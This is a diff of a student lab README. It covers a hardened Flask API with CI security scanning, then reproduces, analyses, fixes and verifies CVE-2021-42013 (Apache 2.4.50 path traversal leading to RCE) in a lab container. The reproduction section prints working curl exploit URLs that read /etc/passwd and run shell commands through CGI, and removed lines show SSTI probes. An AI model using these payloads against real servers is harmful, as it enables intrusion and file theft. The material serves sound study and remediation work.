@@ -1,13 +1,12 @@
-# Work 1 — Secure REST API + CI/CD Security Scanning + Real CVE Reproduction & Fix
+# Work 1 — Secure REST API + CI/CD Security Scanning + CVE-2021-42013 Reproduction & Fix
 
 Network Security LAB (HDU). Author: **Chen Yiming, HDU 23320218**.
 
-This project contains **two parts**:
+This repository contains two parts:
 
-1. **`/` (this directory)** — a hardened Flask REST API with OWASP Top-10 baseline protections and a GitHub Actions CI pipeline running SAST + SCA on every push.
-2. **`/cve-ssti`** — reproduction, root-cause analysis, fix and verification of a real-world server-side template injection (SSTI → RCE) vulnerability from Vulhub.
-
-> **Variant / report title page:** see the course report template (Lab number & name, variant number, Surname and Name, HDU number).
+1. **`/` (root)** — a hardened Flask REST API with OWASP Top-10 baseline protections, plus a GitHub Actions pipeline that runs SAST + SCA on every push.
+2. **`/cve-2021-42013`** — reproduction, root-cause analysis, fix and verification of **CVE-2021-42013** (Apache HTTP Server 2.4.50 path traversal → RCE) from Vulhub.
+3. *Appendix:* `/cve-ssti` — an additional Vulhub environment (Flask SSTI → RCE) that I studied before settling on CVE-2021-42013; kept here as supplementary material.
 
 ---
 
@@ -24,12 +23,13 @@ Python 3.12 / Flask 3, SQLite, PyJWT (HS256), bcrypt.
 | POST | `/api/users` | — | Register a user. Password is hashed with **bcrypt** before storage. Returns the bcrypt hash *prefix* (`$2b$12$…`) as proof that no plaintext is stored. |
 | POST | `/auth/login` | — | Verifies credentials (bcrypt `checkpw`), returns a **JWT** (HS256, 30 min expiry). |
 | GET | `/api/data` | **JWT required** | Returns the posts list. All user-influenced output is HTML-escaped. |
-| GET | `/health` | — | Liveness probe used by CI smoke test. |
+| GET | `/health` | — | Liveness probe used by the CI smoke test. |
 
 ### How to run & call
 
 ```bash
 pip install -r requirements.txt
+export JWT_SECRET=$(python -c "import secrets; print(secrets.token_hex(32))")
 python app.py                      # listens on http://127.0.0.1:5000
 
 # register
@@ -46,31 +46,31 @@ curl -X POST http://127.0.0.1:5000/auth/login \
 curl http://127.0.0.1:5000/api/data -H "Authorization: Bearer <JWT>"
 ```
 
-### Security measures (grading points)
+Full request/response evidence (10 test cases, including the failure branches): `evidence_api_verification.log`.
 
-| Requirement | Implementation | Verified by |
-|---|---|---|
-| **SQLi prevention** | Every SQL statement uses SQLite **parameterized queries** (`?` placeholders) — user input is never concatenated into SQL. | Attack `' OR 1=1--` at login → `401 invalid credentials` (evidence log item [6]). |
-| **XSS prevention** | All user-controlled output escaped via `markupsafe.escape()` before being returned. | Registered user with `display_name = <script>alert(1)</script>` → response contains `&lt;script&gt;…` (item [9]). |
-| **Authentication** | **JWT** (PyJWT, explicit `HS256`, signature + `exp` verified by a decorator on protected endpoints; explicit algorithm whitelist blocks `alg`-confusion). Passwords hashed with **bcrypt** (random salt + slow hashing, resistant to brute force — unlike plain SHA-256). | No token → 401 [1]; forged token → 401 [2]; tampered signature → 401 [10]; valid token → 200 + data [8]. |
+### Security measures
 
-Full request/response evidence: `../evidence_api_verification.log` (10 test cases).
+**SQLi prevention.** Every SQL statement in `app.py` uses SQLite parameterized queries (`?` placeholders) — user input is bound as parameters, never concatenated into the query string. Verified by sending `' OR 1=1--` as the username at login: the server answers `401 invalid credentials` (evidence log item [6]) instead of authenticating.
 
-> `JWT_SECRET` is read from an environment variable — no secrets are committed.
+**XSS prevention.** All user-controlled output (`display_name`, post fields) goes through `markupsafe.escape()` before being returned. Registering a user with `display_name = <script>alert(1)</script>` returns `&lt;script&gt;…` (item [9]).
+
+**Authentication.** Login issues a **JWT** (PyJWT, HS256, 30-minute `exp`). A decorator middleware guards every protected endpoint: it parses the `Authorization: Bearer` header, verifies the signature and expiry, and pins the algorithm whitelist to HS256 (blocks `alg`-confusion). Passwords are hashed with **bcrypt** (random salt, deliberately slow — unlike plain SHA-256, which is fast and unsalted and therefore cheap to brute-force). As one extra hardening detail, when the username does not exist the server still runs one bcrypt comparison against a dummy hash so that "unknown user" and "wrong password" take the same time.
+
+`JWT_SECRET` is read from an environment variable; the app refuses to start without it, so no secret is ever committed.
 
 ### CI/CD — SAST + SCA (`.github/workflows/ci.yml`)
 
 Triggers on **every push / pull request**:
 
 1. **SAST — Bandit**: static security analysis of the code, HTML report uploaded as a build artifact; medium+ severity findings fail the build.
-2. **SCA — pip-audit** (PyPA): checks the pinned dependencies in `requirements.txt` against the PyPA vulnerability database; any known CVE fails the build.
-   - *Real catch*: the initial pins (Flask 3.0.3, PyJWT 2.9.0) were flagged with 18 known advisories (e.g. PYSEC-2026-2151, PYSEC-2025-183). Dependencies were upgraded to Flask 3.1.3 / PyJWT 2.15.0, after which the audit is clean — demonstrating exactly why SCA belongs in CI.
+2. **SCA — pip-audit** (PyPA): checks the pinned dependencies in `requirements.txt` against the PyPA vulnerability database; any known advisory fails the build.
+   - This actually caught something: the initial pins (Flask 3.0.3, PyJWT 2.9.0) were flagged with 18 known advisories (e.g. PYSEC-2026-2151, PYSEC-2025-183). Upgrading to Flask 3.1.3 / PyJWT 2.15.0 cleared the audit — a concrete demonstration of why SCA belongs in the pipeline.
 3. **Smoke test**: boots the API and asserts `/health` returns 200.
 
 **Screenshots:**
 
 ![CI pipeline passing](screenshots/ci-pipeline-success.png)
-*GitHub Actions run #2 — Status: Success (Bandit SAST + pip-audit SCA + smoke test), bandit-report artifact produced.*
+*GitHub Actions run — Status: Success (Bandit SAST + pip-audit SCA + smoke test), bandit-report artifact produced.*
 
 ![Bandit report](screenshots/bandit-report.png)
 *Bandit HTML report — 0 issues found (194 lines of code scanned). Identical to the CI artifact.*
@@ -79,71 +79,104 @@ Triggers on **every push / pull request**:
 
 ---
 
-## Part 2 — CVE Reproduction, Root Cause & Fix (`/cve-ssti`)
+## Part 2 — CVE-2021-42013: Reproduction, Root Cause & Fix
 
 ### Chosen vulnerability
 
-**Flask (Jinja2) Server-Side Template Injection (SSTI) → RCE** — Vulhub `flask/ssti`.
-(Note: the manual's suggested `vulhub/flask/CVE-2018-1000656` no longer exists in
-the official Vulhub repo; this equivalent Flask-stack environment was chosen instead.)
+**CVE-2021-42013 — Apache HTTP Server 2.4.49/2.4.50 path traversal and file disclosure (→ RCE with CGI enabled).**
 
-- **Class**: SSTI (CWE-1336) escalating to remote code execution; OWASP A03:2021 Injection.
-- **Impact**: unauthenticated attacker executes arbitrary OS commands on the server (`www-data`).
-- **Cause**: user input is concatenated into the Jinja2 template *source* — attacker-authored `{{…}}` expressions are executed server-side; via a Python gadget chain (`[].__class__.__base__.__subclasses__()` → `catch_warnings.__init__.__globals__` → `eval`) this becomes full RCE.
+- **What it is**: the fix for CVE-2021-41773 shipped in Apache 2.4.50 was incomplete. An attacker can map URLs to files outside the directories configured by Alias-like directives (`Require all denied` not in effect), reading arbitrary files; with `mod_cgi`/`mod_cgid` enabled the same flaw allows arbitrary command execution.
+- **Severity**: CVSS 3.1 **9.8 Critical** (NVD). Actively exploited in the wild in late 2021.
+- **Affects**: Apache HTTP Server 2.4.49 and 2.4.50 only; fixed in **2.4.51**.
+- **CWE**: CWE-22 (Path Traversal) → CWE-78 (OS Command Injection via CGI).
+
+### Environment
+
+Vulhub `httpd/CVE-2021-42013`: builds `vulhub/httpd:2.4.50` with `mod_cgi`/`mod_cgid` enabled and `<Directory /> Require all granted`, published on port 8080.
+
+![vulnerable target running](cve-2021-42013/evidence/docker-target-running.png)
+*`docker compose up -d` — container `cve-2021-42013-apache-1` Up, `Server: Apache/2.4.50 (Unix)`, port 8080→80.*
 
 ### Reproduction (before fix)
 
-```bash
-cd cve-ssti/vulhub/flask/ssti && docker compose up -d   # vulhub/flask:1.1.1 on :8000
+All requests were sent with `curl --path-as-is` (curl does not normalize the path; the browser address bar also worked). Raw output: `cve-2021-42013/evidence/reproduce_before_fix.log`.
 
-curl 'http://localhost:8000/?name=World'        # -> Hello World
-curl 'http://localhost:8000/?name={{233*233}}'  # -> Hello 54289   (SSTI confirmed)
-# RCE POC (URL-encoded Jinja2 gadget chain -> eval -> os.popen("id").read()):
-curl 'http://localhost:8000/?name=%7B%25%20for%20c%20in%20%5B%5D...'   # -> uid=33(www-data)...
+```bash
+cd vulhub/httpd/CVE-2021-42013 && docker compose up -d
+
+# A0 sanity check
+curl -i http://localhost:8080/                                    # -> It works!
+
+# A1 path traversal: read /etc/passwd (doubly-encoded dots bypass the 2.4.50 patch)
+curl -i --path-as-is "http://localhost:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
+# -> HTTP 200 + full /etc/passwd
+
+# A2 RCE: traverse into /bin/sh and let CGI feed it the request body
+curl -i --path-as-is --data "echo;id" \
+  "http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
+# -> uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+# A3 arbitrary file read via the shell
+curl -s --path-as-is --data "echo;head -n1 /etc/passwd" \
+  "http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
+# -> root:x:0:0:root:/root:/bin/bash
 ```
 
-Evidence: `cve-ssti/evidence/reproduce_before_fix.log` — expression evaluation **and** real command output (`id`, `head -n1 /etc/passwd`).
+**Screenshot — file disclosure (before fix):**
 
-**Screenshot — SSTI confirmed (before fix):**
-
-![SSTI before fix](cve-ssti/evidence/before-fix-ssti.png)
-*`/?name={{233*233}}` is evaluated by the template engine and returns "Hello 54289".*
+![path traversal before fix](cve-2021-42013/evidence/before-fix-traversal.png)
+*Browser on 2.4.50: a traversal URL under `/icons/` returns the container's `/etc/passwd` — a file far outside the document root.*
 
 **Screenshot — RCE (before fix):**
 
-![RCE before fix](cve-ssti/evidence/before-fix-rce.png)
-*The Jinja2 gadget-chain payload executes `id` on the server: `uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root)`.*
+![RCE before fix](cve-2021-42013/evidence/before-fix-rce.png)
+*The CGI traversal payload executes `id` on the server: `uid=1(daemon) gid=1(daemon) groups=1(daemon)`.*
 
 ### Root cause analysis
 
-See **`cve-ssti/root-cause-analysis.md`** — summary: the app confuses **code and data**. `Template("Hello " + name)` lets the attacker write part of a Jinja2 *program*, which the server executes; the unsandboxed `jinja2.Template` allows arbitrary Python object traversal, so template math escalates to RCE.
+Full write-up: **`cve-2021-42013/root-cause-analysis.md`**. In my own words, short version:
 
-### Fix (`cve-ssti/fix/`)
+The bug is a **decode-after-check ordering flaw**. Apache validates the request path (the traversal check) on one representation of the URL, but the filesystem mapping happens later, on a more fully-decoded representation. The 2.4.50 patch tried to close CVE-2021-41773 by blacklisting the *known spellings* of `..` (`%2e%2e`, `.%2e`) instead of fixing the ordering — so a spelling that only becomes `..` after a *second* decode pass, `.%%32%65` → `.%2e` → `..`, sailed through the check again. Same bug, new spelling.
 
-1. **Primary — code/data separation**: template is a developer-owned constant; user input is only passed as a template *variable* (`render_template_string(TEMPLATE, name=name)` — autoescaped, rendered as inert text).
-2. **Defence in depth**: `name` whitelisted to `[A-Za-z0-9 ._-]` (≤64 chars); anything else → HTTP 400 before reaching the template engine.
+Two configuration choices in the environment turn file disclosure into RCE: `mod_cgi` is enabled (so the traversed URL can point at `/bin/sh`, which executes the request body), and the stock `<Directory /> Require all denied` default was rewritten to `Require all granted` (so traversed files outside the docroot are actually served). Code defect provides the traversal; configuration decides the blast radius.
 
-Patch: `cve-ssti/fix/app_fix.patch`. Changed file: `cve-ssti/fix/src/app.py` (drop-in replacement for the Vulhub-mounted `src/app.py`).
+### Fix
+
+Files changed: `cve-2021-42013/fix/Dockerfile` and `cve-2021-42013/fix/docker-compose.yml` (the vulnerable originals are archived in `cve-2021-42013/fix/original/` for comparison).
+
+**Primary fix — upgrade the image to the version where the CVE is fixed**: `FROM vulhub/httpd:2.4.50` → `FROM httpd:2.4.51` (2.4.51 contains the upstream revisions r1893977/r1893980/r1893982 that fully decode and normalize the path *before* validating it). The CGI/`Require all granted` configuration is deliberately kept identical to the vulnerable image — that way the verification below proves the attack dies because of the version fix itself, not because I hardened the environment.
+
+Defence-in-depth recommendations for a real deployment (not applied to the lab image on purpose): keep `Require all denied` as the default for everything outside the docroot, enable CGI only where genuinely needed, and pin images by digest — 2.4.51 itself was superseded within weeks by 2.4.52 (CVE-2021-44790), which is a good reminder that "upgrade to the fixed version" means "upgrade to the *current* version".
+
+Applied with the standard cycle (`docker compose down` → edit Dockerfile → `docker compose up --build -d`). Raw output: [`cve-2021-42013/evidence/fix_applied.log`](cve-2021-42013/evidence/fix_applied.log) — the image rebuilds, `docker ps` shows the container Up, and the banner is now `Apache/2.4.51 (Unix)`.
 
 ### Verification after fix (attack replay + regression)
 
-Identical payloads replayed (`cve-ssti/evidence/verify_after_fix.log`):
+The exact same payloads from step A1–A3 were replayed against 2.4.51. Raw output: `cve-2021-42013/evidence/verify_after_fix.log`.
 
-| Attack | Before | After |
+| Replay | Before fix (2.4.50) | After fix (2.4.51) |
 |---|---|---|
-| `{{233*233}}` | `Hello 54289` | **400 rejected** |
-| RCE POC (`id`) | `uid=33(www-data)…` | **400 rejected** |
-| RCE POC (`/etc/passwd`) | `root:x:0:0:root…` | **400 rejected** |
+| V1 = A1 traversal to `/etc/passwd` | HTTP 200 + file contents | **HTTP 400 Bad Request — rejected** |
+| V2 = A2 CGI RCE (`id`) | `uid=1(daemon)…` | **HTTP 400 — rejected** |
+| V3 = A3 CGI file read | `root:x:0:0:root…` | **HTTP 400 — rejected** |
 
-Regression: `/?name=World` → `Hello World` (200), `/?name=Alice_2026` → works — normal functionality preserved.
+Regression tests: `GET /` still returns `It works!` (200), the aliased `/icons/` directory still serves content (200), normal static files still served (200). Normal functionality is fully preserved.
 
-**Screenshots — attack replay after fix + regression:**
+**Screenshot — attack rejected after fix:**
 
-![after fix rejected](cve-ssti/evidence/after-fix-rejected.png)
-*The same payload `{{233*233}}` is now rejected with HTTP 400 before reaching the template engine.*
+![after fix rejected](cve-2021-42013/evidence/after-fix-rejected.png)
+*The same traversal URL that disclosed `/etc/passwd` on 2.4.50 now returns 400 Bad Request on 2.4.51.*
 
-![regression ok](cve-ssti/evidence/regression-ok.png)
-*Normal functionality preserved: `/?name=World` still returns "Hello World".*
+**Screenshot — regression, normal page still works:**
+
+![after fix regression](cve-2021-42013/evidence/after-fix-regression.png)
+*`http://localhost:8080/` on the fixed server still returns the default page.*
+
+---
+
+## Appendix — extra environment studied (`/cve-ssti`)
+
+Before choosing CVE-2021-42013 I reproduced an SSTI → RCE chain on the Vulhub `flask/ssti` environment (`{{233*233}}` → `54289`, gadget chain → `uid=33(www-data)`), analysed it (code/data confusion in `Template("Hello " + name)`) and fixed it (template-as-constant + input whitelist). Materials: `cve-ssti/` (evidence, `root-cause-analysis.md`, fix patch and layered verification). It is included as supplementary work; the graded CVE for this lab is **CVE-2021-42013** above.
 
 ---
 
@@ -154,9 +187,11 @@ Regression: `/?name=World` → `Hello World` (200), `/?name=Alice_2026` → work
 | Public Git repository | https://github.com/ChenYiming-aaa/network-security-work1 |
 | This README | `README.md` |
 | CI pipeline link (last successful run) | https://github.com/ChenYiming-aaa/network-security-work1/actions/runs/39212736509 |
-| Fixed files folder | `cve-ssti/fix/` (`src/app.py`, `app_fix.patch`, before/after evidence) |
+| Fixed files folder | `cve-2021-42013/fix/` (`Dockerfile`, `docker-compose.yml`, originals in `fix/original/`) |
+| CVE reproduction & verification evidence | `cve-2021-42013/evidence/` (logs + screenshots) |
+| Root cause analysis | `cve-2021-42013/root-cause-analysis.md` |
 
 ## Notes
 
-- `screenshots/bandit-report.html` is the local copy of the Bandit HTML report (identical to the CI artifact `bandit-report`, run #2); the committed `bandit-report.png` is its screenshot.
+- `screenshots/bandit-report.html` is the local copy of the Bandit HTML report (identical to the CI artifact); `bandit-report.png` is its screenshot.
 - The Vulhub working clone (`vulhub/`) is kept outside the repository on purpose; only the reproduction/fix artifacts and evidence are committed.
